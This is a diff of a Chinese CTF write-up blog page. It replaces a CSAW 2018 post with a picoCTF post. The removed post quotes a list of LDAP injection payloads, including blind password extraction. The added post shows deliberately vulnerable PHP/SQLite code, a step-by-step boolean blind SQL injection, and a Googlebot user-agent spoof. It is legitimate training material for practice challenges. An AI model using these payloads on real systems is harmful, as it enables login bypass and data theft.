@@ -93,17 +93,20 @@
 
 
 
-<meta name="description" content="web题质量蛮高的">
+<meta name="description" content="有空就做点">
 <meta name="keywords">
 <meta property="og:type" content="article">
-<meta property="og:title" content="caswctf">
-<meta property="og:url" content="http://Merl1ng.com/2018/09/20/caswctf/index.html">
+<meta property="og:title" content="picoctfwp">
+<meta property="og:url" content="http://Merl1ng.com/2018/10/02/picoctfwp/index.html">
 <meta property="og:site_name" content="Merl1ng's blog">
-<meta property="og:description" content="web题质量蛮高的">
-<meta property="og:updated_time" content="2018-09-20T09:24:40.039Z">
+<meta property="og:description" content="有空就做点">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/sqliteeeeeeeeee.PNG">
+<meta property="og:image" content="http://otvzfr1o1.bkt.clouddn.com/googlebot.PNG">
+<meta property="og:updated_time" content="2018-10-02T10:34:46.388Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="caswctf">
-<meta name="twitter:description" content="web题质量蛮高的">
+<meta name="twitter:title" content="picoctfwp">
+<meta name="twitter:description" content="有空就做点">
+<meta name="twitter:image" content="http://otvzfr1o1.bkt.clouddn.com/sqliteeeeeeeeee.PNG">
 
 
 
@@ -131,13 +134,13 @@
 
 
 
-  <link rel="canonical" href="http://Merl1ng.com/2018/09/20/caswctf/"/>
+  <link rel="canonical" href="http://Merl1ng.com/2018/10/02/picoctfwp/"/>
 
 
 
 
 
-  <title>caswctf | Merl1ng's blog</title>
+  <title>picoctfwp | Merl1ng's blog</title>
   
 
 
@@ -266,7 +269,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2018/09/20/caswctf/">
+    <link itemprop="mainEntityOfPage" href="http://Merl1ng.com/2018/10/02/picoctfwp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Merl1ng">
@@ -283,7 +286,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">caswctf</h1>
+          <h1 class="post-title" itemprop="name headline">picoctfwp</h1>
         
 
         <div class="post-meta">
@@ -295,8 +298,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-20T16:20:27+08:00">
-                2018-09-20
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-02T14:28:25+08:00">
+                2018-10-02
               </time>
             
 
@@ -330,24 +333,38 @@
       
 
       
-        <p>web题质量蛮高的</p>
-<a id="more"></a>
-<h3 id="ldab"><a href="#ldab" class="headerlink" title="ldab"></a>ldab</h3><p>看名字估计就是ldap注入</p>
-<p>按上次nox的payload试了试不行</p>
-<p>github上搜了下</p>
-<p><a href="https://github.com/trapp3rhat/LDAP-injection" target="_blank" rel="external">https://github.com/trapp3rhat/LDAP-injection</a></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div></pre></td><td class="code"><pre><div class="line">LDAP-injection</div><div class="line">Ldap injection payloads</div><div class="line"></div><div class="line">LDAP injection</div><div class="line">LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it<span class="string">'s possible to modify LDAP statements using a local proxy.</span></div><div class="line"></div><div class="line">Exploitation</div><div class="line">user  = *)(uid=*))(|(uid=*</div><div class="line">pass  = password</div><div class="line">query = "(&amp;(uid=*)(uid=*)) (|(uid=*)(userPassword=&#123;MD5&#125;X03MO1qnZdYdgyfeuILPmQ==))"</div><div class="line">Payloads</div><div class="line">*</div><div class="line">*)(&amp;</div><div class="line">*))%00</div><div class="line">*()|%26'</div><div class="line">*()|&amp;<span class="string">'</span></div><div class="line">*(|(mail=*))</div><div class="line">*(|(objectclass=*))</div><div class="line">*)(uid=*))(|(uid=*</div><div class="line">*/*</div><div class="line">*|</div><div class="line">/</div><div class="line">//</div><div class="line">//*</div><div class="line">@*</div><div class="line">|</div><div class="line">admin*</div><div class="line">admin*)((|userpassword=*)</div><div class="line">admin*)((|userPassword=*)</div><div class="line">x' or name()=<span class="string">'username'</span> or <span class="string">'x'</span>=<span class="string">'y</span></div><div class="line">Blind Exploitation</div><div class="line">We can extract using a bypass login</div><div class="line"></div><div class="line">(&amp;(sn=administrator)(password=*))    : OK</div><div class="line">(&amp;(sn=administrator)(password=A*))   : KO</div><div class="line">(&amp;(sn=administrator)(password=B*))   : KO</div><div class="line">...</div><div class="line">(&amp;(sn=administrator)(password=M*))   : OK</div><div class="line">(&amp;(sn=administrator)(password=MA*))  : KO</div><div class="line">(&amp;(sn=administrator)(password=MB*))  : KO</div><div class="line">...</div><div class="line">(&amp;(sn=administrator)(password=MY*))  : OK</div><div class="line">(&amp;(sn=administrator)(password=MYA*)) : KO</div><div class="line">(&amp;(sn=administrator)(password=MYB*)) : KO</div><div class="line">(&amp;(sn=administrator)(password=MYC*)) : KO</div><div class="line">...</div><div class="line">(&amp;(sn=administrator)(password=MYK*)) : OK</div><div class="line">(&amp;(sn=administrator)(password=MYKE)) : OK</div></pre></td></tr></table></figure>
-<p><code>*)(uid=*))(|(uid=*</code> 就出来了</p>
-<p>页面上刚好有uid这个参数 换成其他有的参数也可以</p>
-<h3 id="SSO"><a href="#SSO" class="headerlink" title="SSO"></a>SSO</h3><p>好题啊 交学费 需要sso+ouath2.0的知识 还涉及到了 jwt</p>
-<p>我查了好久ouath感觉还是没到点子上</p>
-<p>一个感觉不错的ouath安全案例 虽然不是这题的点</p>
-<p><a href="https://coolshell.cn/articles/11021.html" target="_blank" rel="external">https://coolshell.cn/articles/11021.html</a></p>
-<p>参考<br><a href="https://github.com/TryCTFAgain/CTF-Writeups/blob/master/2018/CSAW%20CTF&#39;18/web.md#sso" target="_blank" rel="external">https://github.com/TryCTFAgain/CTF-Writeups/blob/master/2018/CSAW%20CTF&#39;18/web.md#sso</a> </p>
-<h3 id="Hacker-Movie-Club"><a href="#Hacker-Movie-Club" class="headerlink" title="Hacker Movie Club"></a>Hacker Movie Club</h3><p>浏览器缓存问题 歪果仁的题真是好新啊 又得交学费</p>
-<p>参考<br><a href="https://lud1161.github.io/posts/hacker-movie-club-csaw-quals-2018/" target="_blank" rel="external">https://lud1161.github.io/posts/hacker-movie-club-csaw-quals-2018/</a></p>
-<h3 id="wtf-sql"><a href="#wtf-sql" class="headerlink" title="wtf sql"></a>wtf sql</h3><p>压轴题 慢慢看</p>
-<p><a href="https://blog.rpis.ec/2018/09/csaw-ctf-quals-2018-wtf-sql.html" target="_blank" rel="external">https://blog.rpis.ec/2018/09/csaw-ctf-quals-2018-wtf-sql.html</a><br>找到了国内师傅的wp 中文看着还是爽 机翻看着真是,,,<br><a href="https://qvq.im/post/CASW%20CTF%202018%20WTF.SQL%20writeup" target="_blank" rel="external">https://qvq.im/post/CASW%20CTF%202018%20WTF.SQL%20writeup</a></p>
+        <p>有空就做点<br><a id="more"></a></p>
+<h3 id="web-650"><a href="#web-650" class="headerlink" title="web 650"></a>web 650</h3><p>报错信息可知是sqlite tjctf上遇过一道sqlite </p>
+<p>有源码 看了下 只能盲注</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;?php</div><div class="line">  include <span class="string">"config.php"</span>;</div><div class="line">  ini_set(<span class="string">'error_reporting'</span>, E_ALL);</div><div class="line">  ini_set(<span class="string">'display_errors'</span>, <span class="string">'On'</span>);</div><div class="line"></div><div class="line">  <span class="variable">$answer</span> = <span class="variable">$_POST</span>[<span class="string">"answer"</span>];</div><div class="line">  <span class="variable">$debug</span> = <span class="variable">$_POST</span>[<span class="string">"debug"</span>];</div><div class="line">  <span class="variable">$query</span> = <span class="string">"SELECT * FROM answers WHERE answer='<span class="variable">$answer</span>'"</span>;</div><div class="line">  <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;"</span>;</div><div class="line">  <span class="built_in">echo</span> <span class="string">"SQL query: "</span>, htmlspecialchars(<span class="variable">$query</span>), <span class="string">"\n"</span>;</div><div class="line">  <span class="built_in">echo</span> <span class="string">"&lt;/pre&gt;"</span>;</div><div class="line">?&gt;</div><div class="line">&lt;?php</div><div class="line">  <span class="variable">$con</span> = new SQLite3(<span class="variable">$database_file</span>);</div><div class="line">  <span class="variable">$result</span> = <span class="variable">$con</span>-&gt;query(<span class="variable">$query</span>);</div><div class="line"></div><div class="line">  <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetchArray();</div><div class="line">  <span class="keyword">if</span>(<span class="variable">$answer</span> == <span class="variable">$CANARY</span>)  &#123;</div><div class="line">    <span class="built_in">echo</span> <span class="string">"&lt;h1&gt;Perfect!&lt;/h1&gt;"</span>;</div><div class="line">    <span class="built_in">echo</span> <span class="string">"&lt;p&gt;Your flag is: <span class="variable">$FLAG</span>&lt;/p&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  elseif (<span class="variable">$row</span>) &#123;</div><div class="line">    <span class="built_in">echo</span> <span class="string">"&lt;h1&gt;You are so close.&lt;/h1&gt;"</span>;</div><div class="line">  &#125; <span class="keyword">else</span> &#123;</div><div class="line">    <span class="built_in">echo</span> <span class="string">"&lt;h1&gt;Wrong.&lt;/h1&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>‘ or 1 –+<br>‘ or 0 –+ </p>
+<p>回显不同 拿到注入点</p>
+<p>试一下注版本 ‘ or substr(sqlite_version(),1,1)=’3’</p>
+<p>‘ or substr(sqlite_version(),1,1)=’4’</p>
+<p>完全ojbk 符合预期</p>
+<p>注表名 ‘ or substr((select name from sqlite_master limit 0,1),1,1)=’a’</p>
+<p>…</p>
+<p>因为题目中 sql语句给了 SELECT * FROM answers WHERE answer=’$answer’</p>
+<p>猜是 answer</p>
+<p>试了下好像对的 不过多一位是 answers</p>
+<p>然后想 注字段</p>
+<p>‘ or substr((select columns from name limit 0,1),1,1)=’a’</p>
+<p>不行 报错</p>
+<p>那我就猜了 应该就是answer</p>
+<p>‘ or substr((select answer from answers limit 0,1),0,1)=’a’</p>
+<p>试的时候还是用的 &gt; 或 &lt; burp里 = </p>
+<p>ojbk </p>
+<p>懒得写脚本了 而且好像有点问题 &lt;!好像都不行 就用=爆破了</p>
+<p>burp逐位爆了下</p>
+<p>然后提交answer即可拿到flag</p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/sqliteeeeeeeeee.PNG" alt=""></p>
+<p>sqlite注入参考<br><a href="https://www.cnblogs.com/xiaozi/p/5760321.html" target="_blank" rel="external">https://www.cnblogs.com/xiaozi/p/5760321.html</a></p>
+<h3 id="web-200"><a href="#web-200" class="headerlink" title="web 200"></a>web 200</h3><p>说你不来自google 并显示你的ua</p>
+<p>so 很明显要伪造ua 但我咋改都不行</p>
+<p>后来搜到了这篇文章<br><a href="https://blog.csdn.net/Everywhere_wwx/article/details/78266399" target="_blank" rel="external">https://blog.csdn.net/Everywhere_wwx/article/details/78266399</a></p>
+<p>里面提到了一个firefox的ua 插件</p>
+<p>安了下自带一个 googlebot的ua 一用 ojbk</p>
+<p><img src="http://otvzfr1o1.bkt.clouddn.com/googlebot.PNG" alt=""></p>
 
       
     </div>
@@ -384,18 +401,14 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/09/21/xjnuwp/" rel="next" title="xjnuwp">
-                <i class="fa fa-chevron-left"></i> xjnuwp
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/09/10/hackit&icewp/" rel="prev" title="hackit&icewp">
-                hackit&icewp <i class="fa fa-chevron-right"></i>
+              <a href="/2018/09/23/安恒9月赛wp/" rel="prev" title="安恒9月赛wp">
+                安恒9月赛wp <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -546,7 +559,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#ldab"><span class="nav-number">1.</span> <span class="nav-text">ldab</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSO"><span class="nav-number">2.</span> <span class="nav-text">SSO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hacker-Movie-Club"><span class="nav-number">3.</span> <span class="nav-text">Hacker Movie Club</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#wtf-sql"><span class="nav-number">4.</span> <span class="nav-text">wtf sql</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#web-650"><span class="nav-number">1.</span> <span class="nav-text">web 650</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-200"><span class="nav-number">2.</span> <span class="nav-text">web 200</span></a></li></ol></div>
             
 
           </div>
